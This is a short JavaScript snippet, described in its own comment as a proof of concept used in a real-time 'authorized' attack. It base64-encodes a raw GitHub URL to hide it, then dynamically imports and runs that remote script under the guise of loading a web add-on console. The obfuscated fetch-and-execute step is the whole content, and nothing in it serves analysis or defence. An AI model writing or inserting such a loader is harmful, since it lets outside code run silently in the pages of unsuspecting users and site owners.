
//This is an Proof of Concept and was used for an realtime Autorized attack by Me.





(async () => {
  const source = atob(
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dvdFVyQmFjay1QdWJsaWMvV2ViLWFkZG9uLWxpYnJhcnkvMTk4NjY4YTVlZmFmNWY4NmI2Njc2YzVjYzI4NzliZGRmYWU0ODNlYy9leGVjdXRhYmxlL2FkZG9uLmpz"
  );

  try {
    const addon = await import(source);

    if (typeof addon.registerAddonConsole !== "function") {
      throw new TypeError("Addon entry point is missing.");
    }

    addon.registerAddonConsole();
  } catch (error) {
    console.error("[web-addon] Could not load addon:", error);
  }
})();
